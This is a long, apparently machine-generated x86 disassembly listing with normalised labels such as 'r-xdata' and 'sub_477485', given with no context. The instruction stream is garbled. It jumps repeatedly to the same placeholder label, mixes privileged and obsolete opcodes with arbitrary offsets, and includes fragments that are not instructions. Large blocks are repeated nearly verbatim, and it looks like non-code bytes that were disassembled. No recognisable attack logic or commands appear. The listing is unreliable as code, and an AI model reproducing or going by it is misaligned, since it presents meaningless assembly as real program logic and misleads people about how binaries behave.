cmp eax 0x617f9263
jpo r-xdata
mov es [ esp + eax * 4 + 0x74ebebeb ]
jmp r-xdata
xchg edx eax
dec edx
aaa
jpo r-xdata
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
mov edx 0x117b7b55
sbb al dh
mov eax [ 0xffffffff8726f21d ]
xchg edx eax
fdiv [ ebp + 0x7b ]
jpo r-xdata
stosd [ edi ]
jmp 0xffffffff9274793d
jmp r-xdata
pop es
pop edi
push edi
inc edx
pop es
jmp j_sub_477df5
jpo r-xdata
jmp r-xdata
das
jpo r-xdata
adc [ edx + 0x7b7b4e5a ] 0xffffffeb
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
xchg ebx eax
scasd [ edi ]
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_477485
xchg edi eax
xchg edx eax
and edi [ esi ]
jpo r-xdata
sub [ ecx ] dl
jg r-xdata
jmp sub_477478
xchg edx eax
xor eax 0xeb7b7b2c
xchg edx eax
mov [ 0xfffffffff67b7b5b ] al
div [ ebx - 0x6c7b7b7a ]
into
pop ebx
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
loope r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
dec eax
push cs
mov ch 0x92
jpo r-xdata
std
pop eax
pop ebx
jpo r-xdata
dec eax
mov ebx 0xebb8b23b
jmp r-xdata
jmp r-xdata
or al 0x1a
xchg edx eax
sub [ ebp + 0x7b ] esp
jpo r-xdata
mov al [ 0x1daf3ef6 ]
dec edi
inc eax
jpo r-xdata
scasd [ edi ]
sbb eax 0x92b50ef2
xchg edx eax
or al 0x1a
mov edi 0x3ba6925b
jpo r-xdata
outsd
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
inc edi
js r-xdata
test [ edi + 0x78 ] 0xf8
mov bh 0x44
mov edi 0x1a0c362d
mov ebx 0x809dfe74
test [ esi + esi * 8 + 0x7b92b306 ] al
imul edi [ ebx + 0x7b ] 0xffffffeb
mov esp 0x362dbf3e
jmp r-xdata
pop ds
pop edi
add al 0x7f
jpo r-xdata
push es
mov bl 0x92
jmp r-xdata
xchg edx eax
pop edi
pop ecx
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
adc eax [ ebx - 0x6dcdbb49 ]
pop esp
sub eax 0xebeb7b7b
jmp r-xdata
jmp r-xdata
dec ebx
pop ebp
cmp al 0x7b
jpo r-xdata
jmp r-xdata
lodsd [ esi ]
dec eax
dec eax
mov ebx 0xb2202524
mov eax 0x92241311
add [ esp + eax * 4 - 0xd141415 ] 0x78bc8326
and esp [ edx ]
and ah [ edx ]
sbb eax 0xff74aa40
jpo r-xdata
cli
inc ebx
sub edi [ esi ]
jpo r-xdata
jpo r-xdata
popad
pop eax
jpo r-xdata
adc [ edx - 0x6e ] edi
hlt
jmp r-xdata
jmp r-xdata
xchg edx eax
jns r-xdata
r-xdata
jmp r-xdata
cmp [ ebx - 0x6e ] al
and al 0x3c
jpo r-xdata
xchg edx eax
sub edi [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jae r-xdata
je r-xdata
jmp r-xdata
jpo r-xdata
dec eax
mov dl 0x1d
r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
js r-xdata
adc [ ebx - 0x7c ] edi
sub esi [ edi ]
jmp r-xdata
inc edx
ja r-xdata
jpo r-xdata
jpo r-xdata
dec [ ebx + 0x5d ]
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
je r-xdata
int1
imul edx [ edx + 0x7b7b48ad ] 0xffffffeb
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
test [ ebx + 0x7b ] ebx
jpo r-xdata
sub eax 0x921a0c36
je r-xdata
jpo r-xdata
xchg [ esi + 0x7b ] bh
jpo r-xdata
pop ss
xchg edx eax
jmp r-xdata
inc [ esi ]
ja r-xdata
push es
js r-xdata
xchg edx eax
sub eax 0x2eb4921f
jpo r-xdata
outsb
fdivr st0
test [ ebx + 0x74 ] ebx
stc
xchg edx eax
test [ esp + eax * 4 - 0x6d78c17c ] al
lodsd [ esi ]
dec ecx
jpo r-xdata
mov ebx 0x922cb8b2
xlat
xchg edx eax
r-xdata
insb
jpo r-xdata
jpo r-xdata
jmp r-xdata
xchg eax esi
pop es
neg [ edi - 0x4a0f72b8 ]
jmp r-xdata
jpo r-xdata
push ebx
jno r-xdata
jpo r-xdata
inc ebp
push eax
jpo r-xdata
and ah [ edx ]
and bl [ 0xffffffffff74aa40 ]
jmp r-xdata
je r-xdata
xchg edx eax
jpo r-xdata
and dh dh
aas
pop edi
inc ebx
xchg edx eax
jo r-xdata
xchg edx eax
xchg edx eax
add [ esp + eax * 4 + 0x2bebebeb ] 0x7b6f9f92
jpo r-xdata
push ss
xor [ edi + 0x5c923244 ] 0x2d
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
lahf
jle r-xdata
test ch ch
xlat
jpo r-xdata
sbb eax 0x22b936f2
adc [ esi ] ecx
pop es
mov [ esp + eax * 4 - 0x14141415 ] es
adc ebx esi
jpo r-xdata
sbb eax 0x92b73ef2
adc [ esi ] edx
jmp r-xdata
test bl ch
jmp r-xdata
jmp r-xdata
xor dl [ edx + 0x7b7b2d5c ]
inc esp
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
adc [ 0x1d161123 ] ecx
mov bh 0x92

jmp r-xdata
sbb eax 0x929f3ef2
lea esi [ ebx + 0x7b ]
jpo r-xdata
xchg edi eax
sub ch [ eax ]
xchg edx eax
popfd
ja r-xdata
jpo r-xdata
mov edx [ edx + 0x7b7b6737 ]
jmp r-xdata
daa
pop edi
outsd
xchg ebx eax
jmp r-xdata
jpo r-xdata
push ebx
xchg edx eax
mov edx 0xeb7b7b42
jmp r-xdata
test [ esi ] cl
popfd
sbb eax 0x928b36f2
push edi
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
clc
inc edx
jpo r-xdata
jmp r-xdata
xchg ebx eax
or eax 0x927b7b65
sub esi esi
mov ebx 0x7b644992
jpo r-xdata
jpo r-xdata
xor [ ecx + 0x7b ] dl
jpo r-xdata
test [ ebx + ebp + 0x70938cf0 ] al
jg r-xdata
mov edx 0x7b64a192
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
xchg edx eax
jge r-xdata
int3
mov ecx 0x920e1122
xchg eax edi
xchg [ edi + 0x74 ] edi
jmp r-xdata
push edi
jpo r-xdata
sbb eax 0xfe7b7b67
pop ebp
jpo r-xdata
xchg edx eax
jmp r-xdata
clc
lahf
cmp edx 0xffffff97
out dx eax
jg r-xdata
jmp r-xdata
cmp al 0xfe
mov ebx 0x399dfe74
jpo r-xdata
mov ebx 0x7b63ff74
jpo r-xdata
jpo r-xdata
jpo r-xdata
clc
pop es
pop edi
outsd
jpe r-xdata
jpo r-xdata
clc
sbb [ 0x21c52ef2 ] ebx
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jmp r-xdata
idiv [ esi ]
cmpsd [ esi ] [ edi ]
sub esi eax
mov ebp 0x7b650d93
jpo r-xdata
jle r-xdata
aad 0x11
jpo r-xdata
xchg edx eax
xchg ebx eax
lds ecx [ ebp - 0x506d7b7c ]
cmp [ ebx + 0x7b ] edi
adc [ ebx ] 0x74
stc
push esi
push edi
jpo r-xdata
jpo r-xdata
jmp r-xdata
lodsd [ esi ]
pop ebx
jpo r-xdata
fist [ ecx + 0x7b ]
jpo r-xdata
adc al 0x92
jpo r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b575efe ]
jpo r-xdata
adc [ edx + edx * 4 ] edx
pop ds
mov dl 0xb8
jmp r-xdata
mov ah 0x76
jpo r-xdata
jpo r-xdata
in eax 0x5b
jpo r-xdata
or [ 0xffffffff92c536f2 ] bl
sbb eax 0x20d726f2
sbb eax 0x11d526f2
jmp r-xdata
jpo r-xdata
xchg edx eax
sub esi esi
jmp r-xdata
pop ebx
sub bh [ ebx + 0x7b ]
jmp r-xdata
cmp [ ebx + 0x7b ] bh
jmp r-xdata
mov eax 0x117b7b7b
adc [ eax ] ebx
xchg ebx eax
fdiv [ ebx + edi * 2 ]
jpo r-xdata
jpo r-xdata
cmp [ ebx + 0x28 ] ch
clc
cmpsd [ esi ] [ edi ]
push 0x7b
jpo r-xdata
xchg edx eax
jmp r-xdata
xlat
sbb eax 0x21c72ef2
adc [ ecx ] ebx
sbb eax 0x21c52ef2
adc [ edi ] ebx
xchg edx eax
dec ecx
jpo r-xdata
jmp r-xdata
mov edi 0x47004277
test [ esi + edi * 8 + 0x5e ] dh
push edi
jpo r-xdata
xchg ebx eax
imul [ ebp + 0x7b ]
jmp r-xdata
popad
jpo r-xdata
jmp r-xdata
jmp r-xdata
je r-xdata
jpo r-xdata
daa
sub edi [ ebx + 0x7b ]
sub eax 0x7b6df793
mov edx 0x692d938b
jpo r-xdata
idiv [ eax ]
imul ebp [ eax ] 0xfffffff8
and [ edx + 0x7b7b4ce6 ] edx
add [ ebx + edi * 2 + 0x7b ] dh
jmp r-xdata
jpo r-xdata
jmp r-xdata
add [ edi + 0x74 ] al
jpo r-xdata
cwde
xchg edx eax
xlat
pushad
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
and al 0x7d
jpo r-xdata
std
xchg [ ebx + 0x7b ] edi
jpo r-xdata
test [ esi ] cl
jae r-xdata
idiv ah
jmp r-xdata
xchg edx eax
0x137b7b65 0x4996
jge r-xdata
xchg edx eax
add bh [ edx ]
jpo r-xdata
inc [ edi ]
adc [ edx + 0x7b7b60d7 ] 0xeb
jmp r-xdata
jpo r-xdata
shufps xmm3 [ edi + 0x26f0b248 ] 0x8f
dec edx
jpo r-xdata
sub dl dh
pop edi
je r-xdata
xchg [ esp + eax * 4 - 0x64c109d5 ] al
xchg edx eax
pop esi
insd
jpo r-xdata
sub eax [ esi + ecx + 0x7fef673 ]
int 0x54
jpo r-xdata
and ah ch
test [ edx + 0x7b7b84c2 ] al
jpo r-xdata
cld
outsd
r-xdata
cmp edi [ ebx + 0x7b ]
sbb eax 0x929f3ef2
cmp ecx [ edx + 0x7b ]
jpo r-xdata
jpo r-xdata
[ edi ]
clc
mov edi 0x6bbc9263
jpo r-xdata
je r-xdata
jle r-xdata
mov ebx 0x8858ff74
xchg edx eax
xlat
push esp
jpo r-xdata
xchg edx eax
jle r-xdata
mov eax 0x7b7d8992
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
fwait
jmp r-xdata
sbb eax 0x92b52ef2
jpo r-xdata
idiv [ esi ]
jpo r-xdata
test [ esp + ebp + 0xa6fcc74 ] al
test [ ecx ] 0xc4
jmp r-xdata
je r-xdata
jpo r-xdata
test [ esi ] cl
jae r-xdata
je r-xdata
std
jmp r-xdata
jmp r-xdata
xchg ebx eax
jmp r-xdata
cmp [ ebx + 0x7b ] 0x7b
xchg ebx eax
stosd [ edi ]
jpo r-xdata
std
xchg edx eax
shl [ ebx + 0x7b ] 0x1
jpo r-xdata
xchg ebx eax
loop r-xdata
movsb [ edi ] [ esi ]
r-xdata
mov ch 0x92
mov ebp 0x7b6b5f3f
inc edx
pop es
pop edi
dec edi
xchg ebx eax
cmpsd [ esi ] [ edi ]
sub [ edx + 0x7b7b4d5b ] dl
jmp r-xdata
clc
mov ecx 0x78cd925b
jpo r-xdata
fstp [ ebx + edi * 2 ]
jmp r-xdata
jpo r-xdata
mov edx 0xf87b7b64
mov edi 0x407df26f
jl r-xdata
retn
clc
test [ edx + 0x74 ] ah
cld
js r-xdata
add esp eax
jmp r-xdata
jpo r-xdata
stc
jne r-xdata
jpo r-xdata
sub al 0x84
sub eax 0x4d849273
jpo r-xdata
idiv [ edi ]
pop edi
aaa
xchg edx eax
inc esi
jpo r-xdata
jpo r-xdata
je r-xdata
test [ 0xffffffff8483f81f ] ch
jmp r-xdata
jpo r-xdata
mov ebx 0x7b3cf092
jpo r-xdata
test [ edx + 0x7b7b51ac ] edx
sbb eax 0x118f3ef2
daa
jmp r-xdata
jmp r-xdata
jpo r-xdata
fwait
xchg edx eax
fdiv [ esi + 0x7b ]
xchg edx eax
sti
xor [ ebx + 0x7b ] edi
jmp r-xdata
jpo r-xdata
jpo r-xdata
sbb eax 0xf0a526f2
mov eax [ 0xffffffff9b26f21d ]
xchg edx eax
les eax [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jne r-xdata
idiv [ esi ]
sti
sub [ ebx ] ch
jpo r-xdata
jmp r-xdata
dec eax
je r-xdata
xchg [ esi ] edi
mov esi 0xeb84848e
jmp r-xdata
jmp r-xdata
mov dl 0xf0
and [ 0x11d526f2 ] bl
xlat
mov edx 0x696a9273
jpo r-xdata
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
clc
and eax 0x927b7b40
jmp r-xdata
test bl ch
jmp r-xdata
cmp eax 0x25f8747d
jpo r-xdata
xchg edx eax
sub al 0x81
test [ ebx + ebp * 8 - 0x7b141415 ] al
maxps xmm4 [ ebx - 0x6d ]
jpo r-xdata
mov esi ebx
fwait
stosd [ edi ]
[ eax - 0x78 ]
xchg [ edx - 0x7b7b76b7 ] edx
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b4e5a ] 0xffffffeb
xchg ebx eax
popfd
aas
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x54c10de3 ] al
inc eax
jpo r-xdata
jmp r-xdata
cmp eax 0x67af936f
jpo r-xdata
jno r-xdata
xchg edx eax
xchg edx eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
and [ edx + 0x7b7b55ba ] dl
adc [ eax ] ebx
fwait
jmp r-xdata
jge r-xdata
sbb eax 0x927b41f8
adc [ edx + 0x7b ] 0x7b
and bh dh
mov ebx 0x7b7fff74
jpo r-xdata
jns r-xdata
mov [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi edi
add [ ebp - 0x52 ] ah
sub al 0xf2
cmp eax 0x617f9263
jpo r-xdata
mov es [ esp + eax * 4 + 0x74ebebeb ]
jmp r-xdata
xchg edx eax
dec edx
aaa
jpo r-xdata
test [ ebx + ebp * 8 - 0xf141415 ] al
xchg [ edx - 0x7b7b76b7 ] edx
xchg edx eax
mov edx 0x117b7b55
sbb al dh
mov eax [ 0xffffffff8726f21d ]
xchg edx eax
fdiv [ ebp + 0x7b ]
jpo r-xdata
stosd [ edi ]
jmp 0xffffffff9274793d
jmp r-xdata
pop es
pop edi
push edi
inc edx
pop es
jmp j_sub_477df5
jpo r-xdata
jmp r-xdata
das
jpo r-xdata
adc [ edx + 0x7b7b4e5a ] 0xffffffeb
sub eax 0x8092a3f0
pushad
jpo r-xdata
jpo r-xdata
xchg ebx eax
scasd [ edi ]
jpo r-xdata
push ecx
jpo r-xdata
test [ esi ] cl
xchg [ edx + 0x7b7b35ad ] edx
jmp sub_477ee8
jmp r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
test al dh
jmp r-xdata
jmp r-xdata
xchg edx eax
lodsd [ esi ]
xor eax 0xbceb7b7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
test [ eax + ebp + 0x3ef67f11 ] al
idiv [ esi ]
mov dl 0x42
ja r-xdata
inc edx
test [ edi ] cl
pop edi
outsd
aaa
pop edi
push ebx
xchg edx eax
bound edx [ ebp + 0x7b ]
cmpsd [ esi ] [ edi ]
sub esi eax
adc [ edx + 0x7b7b4cba ] 0xffffffeb
jmp r-xdata
add [ esp + eax * 4 - 0x980eed8 ] 0x3e
scasd [ edi ]
sub eax [ ebp + ecx - 0x50d90dd5 ]
xchg edx eax
or eax 0xeb7b7b3d
jmp r-xdata
outsb
inc ebp
jpo r-xdata
mov dl 0xb8
push [ edx + 0x7b452f92 ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
std
mov ebx 0x927b7b7b
jmp r-xdata
test [ edi + edi * 8 + 0x4a ] dh
cmp eax 0xb2487b7b
jpo r-xdata
jpo r-xdata
test [ ebx ] ch
sub [ esp + ebp - 0x54310d91 ] al
jmp r-xdata
xchg ebp eax
xchg edx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
mov bh 0x8f
test [ ebx + ebp * 8 - 0x6d141415 ] al
add al 0x7b
jpo r-xdata
je r-xdata
and dh [ edx - 0x14141448 ]
jmp sub_4782bc
xchg edx eax
fidiv [ edx ]
jpo r-xdata
mov al [ esp + eax * 4 - 0x72c10de3 ]
xchg edx eax
cmp [ edi + 0x7b ] bh
jpo r-xdata
sbb [ 0xffffffff929536f2 ] 0x13
jmp r-xdata
out dx al
cmp edi [ ebx + 0x7b ]
sbb eax 0x7b3d00f8
test [ edi + 0x78 ] 0x92
jmp r-xdata
jmp r-xdata
adc ecx [ edx - 0xde27b7c ]
lea edx [ edx + 0x7b7b7f38 ]
jpo r-xdata
inc edi
js r-xdata
xchg [ esp + eax * 4 - 0x18b4402 ] al
jno r-xdata
into
stosd [ edi ]
test [ ebx + ebp * 8 - 0x5008b15 ] al
pop ds
xor bh [ ebx + 0x7b ]
xchg edx eax
pop ecx
jpo r-xdata
xchg edx eax
sbb [ edi + 0x7b ] eax
jpo r-xdata
jpo r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
test bl ch
jmp j_sub_4783e0
cmp al 0x7a
sub esi [ ebp + ecx * 8 + 0x7c ]
sub edx [ edx + 0x7b7b50b9 ]
jmp r-xdata
je r-xdata
jo r-xdata
cli
sub_4774d9
xor edx 0x3e
xchg ebx eax
xchg edx eax
jpe r-xdata
jpo r-xdata
test [ ebx + ebp + 0x2b973ef6 ] al
idiv dh
mov edi 0x2b848487
test ch ch
xchg edi eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
div [ ebx - 0x6c7b7b7a ]
into
pop ebx
jpo r-xdata
test [ ebx + ebp + 0x7b97ed84 ] al
jpo r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
loope r-xdata
jb r-xdata
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
dec eax
push cs
mov ch 0x92
jpo r-xdata
xchg edx eax
jns r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
std
dec eax
mov ebx 0xebb8b23b
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg ebx eax
push ecx
das
jpo r-xdata
or al 0x1a
xchg edx eax
sub [ ebp + 0x7b ] esp
jpo r-xdata
mov al [ 0x1daf3ef6 ]
dec edi
inc eax
jpo r-xdata
scasd [ edi ]
sbb eax 0x92b50ef2
dec [ ebx + 0x5d ]
je r-xdata
jmp r-xdata
pop eax
pop ebx
jpo r-xdata
jmp r-xdata
clc
mov edi 0x4f7d9277
xchg edx eax
or al 0x1a
mov edi 0x3ba6925b
jpo r-xdata
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
cli
inc ebx
sub edi [ esi ]
jpo r-xdata
inc [ esi ]
ja r-xdata
push es
js r-xdata
and ah [ edx ]
and bl [ 0xffffffffff74aa40 ]
mov ebx 0x809dfe74
test [ esi + esi * 8 + 0x7b92b306 ] al
imul edi [ ebx + 0x7b ] 0xffffffeb
mov esp 0x362dbf3e
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
inc edi
js r-xdata
test [ edi + 0x78 ] 0xf8
r-xdata
jmp r-xdata
cmp [ ebx - 0x6e ] al
and al 0x3c
jpo r-xdata
xchg edx eax
sub edi [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
adc [ edx - 0x6e ] edi
hlt
jpo r-xdata
push es
mov bl 0x92
jmp r-xdata
xchg edx eax
mov bh 0x44
mov edi 0x1a0c362d
pop ds
pop edi
add al 0x7f
jpo r-xdata
dec eax
mov dl 0x1d
r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
js r-xdata
jpo r-xdata
xchg edx eax
pop edi
pop ecx
jpo r-xdata
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
je r-xdata
int1
imul edx [ edx + 0x7b7b48ad ] 0xffffffeb
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
jpo r-xdata
jmp r-xdata
test [ ebx + 0x7b ] ebx
jpo r-xdata
sub eax 0x921a0c36
jpo r-xdata
xchg edx eax
adc eax [ ebx - 0x6dcdbb49 ]
pop esp
sub eax 0xebeb7b7b
jmp r-xdata
jmp r-xdata
jpo r-xdata
dec ebx
pop ebp
jmp r-xdata
xchg edx eax
sub eax 0x2eb4921f
jpo r-xdata
outsb
fdivr st0
test [ ebx + 0x74 ] ebx
stc
xchg edx eax
test [ esp + eax * 4 - 0x6d78c17c ] al
lodsd [ esi ]
dec ecx
jpo r-xdata
mov ebx 0x922cb8b2
xlat
xchg edx eax
r-xdata
adc [ ebx - 0x7c ] edi
sub esi [ edi ]
jmp r-xdata
inc edx
cmp al 0x7b
jpo r-xdata
jmp r-xdata
lodsd [ esi ]
dec eax
inc ebp
push eax
jpo r-xdata
dec eax
mov ebx 0xb2202524
mov eax 0x92241311
add [ esp + eax * 4 - 0xd141415 ] 0x78bc8326
and esp [ edx ]
and ah [ edx ]
sbb eax 0xff74aa40
jmp r-xdata
xchg eax esi
pop es
neg [ edi - 0x4a0f72b8 ]
jmp r-xdata
je r-xdata
xchg edx eax
jmp r-xdata
je r-xdata
jpo r-xdata
popad
pop eax
jpo r-xdata
xchg edx eax
lahf
jle r-xdata
insb
jpo r-xdata
jpo r-xdata
jae r-xdata
xchg edx eax
add [ esp + eax * 4 + 0x2bebebeb ] 0x7b6f9f92
jpo r-xdata
adc [ esi ] edx
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
and dh dh
aas
pop edi
inc ebx
xchg edx eax
jo r-xdata
ja r-xdata
jpo r-xdata
sbb eax 0x92b73ef2

jmp r-xdata
sbb eax 0x929f3ef2
lea esi [ ebx + 0x7b ]
jpo r-xdata
xchg edi eax
sub ch [ eax ]
xchg edx eax
popfd
ja r-xdata
test ch ch
xlat
jpo r-xdata
sbb eax 0x22b936f2
adc [ esi ] ecx
pop es
mov [ esp + eax * 4 - 0x14141415 ] es
adc ebx esi
jpo r-xdata
jpo r-xdata
xchg [ esi + 0x7b ] bh
jpo r-xdata
pop ss
xchg edx eax
jmp r-xdata
push ebx
xchg edx eax
mov edx 0xeb7b7b42
jmp r-xdata
test [ esi ] cl
popfd
sbb eax 0x928b36f2
push edi
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
jmp r-xdata
jmp r-xdata
jpo r-xdata
push ebx
jno r-xdata
xchg ebx eax
or eax 0x927b7b65
sub esi esi
mov ebx 0x7b644992
jpo r-xdata
jpo r-xdata
mov edx [ edx + 0x7b7b6737 ]
jmp r-xdata
daa
pop edi
outsd
xchg ebx eax
jmp r-xdata
jpo r-xdata
push ss
xor [ edi + 0x5c923244 ] 0x2d
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
clc
inc edx
jpo r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
jmp r-xdata
xor dl [ edx + 0x7b7b2d5c ]
inc esp
push edi
jpo r-xdata
sbb eax 0xfe7b7b67
pop ebp
jpo r-xdata
xchg edx eax
jmp r-xdata
jpo r-xdata
xor [ ecx + 0x7b ] dl
jpo r-xdata
test [ ebx + ebp + 0x70938cf0 ] al
jg r-xdata
mov edx 0x7b64a192
jpo r-xdata
jpo r-xdata
dec ebp
cmp [ ebx + 0x7b ] bh
adc [ 0x1d161123 ] ecx
mov bh 0x92
jpo r-xdata
clc
sbb [ 0x21c52ef2 ] ebx
adc [ ebx - 0x7c ] edi
in eax dx
xlat
jmp r-xdata
idiv [ esi ]
cmpsd [ esi ] [ edi ]
sub esi eax
mov ebp 0x7b650d93
jpo r-xdata
jle r-xdata
dec ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
jmp r-xdata
xchg edx eax
jge r-xdata
int3
mov ecx 0x920e1122
xchg eax edi
xchg [ edi + 0x74 ] edi
jmp r-xdata
fist [ ecx + 0x7b ]
jpo r-xdata
adc al 0x92
jpo r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b575efe ]
jpo r-xdata
adc [ edx + edx * 4 ] edx
pop ds
mov dl 0xb8
jmp r-xdata
mov ah 0x76
jpo r-xdata
jpo r-xdata
in eax 0x5b
jpo r-xdata
clc
lahf
cmp edx 0xffffff97
out dx eax
jg r-xdata
jmp r-xdata
cmp al 0xfe
mov ebx 0x399dfe74
jpo r-xdata
mov ebx 0x7b63ff74
jpo r-xdata
jpo r-xdata
jpo r-xdata
clc
pop es
pop edi
outsd
jpe r-xdata
mov eax 0x117b7b7b
adc [ eax ] ebx
xchg ebx eax
fdiv [ ebx + edi * 2 ]
jpo r-xdata
jpo r-xdata
cmp [ ebx + 0x28 ] ch
clc
cmpsd [ esi ] [ edi ]
push 0x7b
jpo r-xdata
xchg edx eax
jmp r-xdata
or [ 0xffffffff92c536f2 ] bl
aad 0x11
jpo r-xdata
xchg edx eax
xchg ebx eax
lds ecx [ ebp - 0x506d7b7c ]
cmp [ ebx + 0x7b ] edi
adc [ ebx ] 0x74
stc
push esi
push edi
jpo r-xdata
jpo r-xdata
jmp r-xdata
lodsd [ esi ]
pop ebx
jpo r-xdata
sbb eax 0x20d726f2
sbb eax 0x11d526f2
jmp r-xdata
mov edi 0x47004277
test [ esi + edi * 8 + 0x5e ] dh
push edi
jpo r-xdata
xchg ebx eax
imul [ ebp + 0x7b ]
jmp r-xdata
jpo r-xdata
xchg edx eax
sub esi esi
jmp r-xdata
pop ebx
sub bh [ ebx + 0x7b ]
jmp r-xdata
cmp [ ebx + 0x7b ] bh
jmp r-xdata
xlat
je r-xdata
jpo r-xdata
daa
sub edi [ ebx + 0x7b ]
sub eax 0x7b6df793
mov edx 0x692d938b
jpo r-xdata
idiv [ eax ]
imul ebp [ eax ] 0xfffffff8
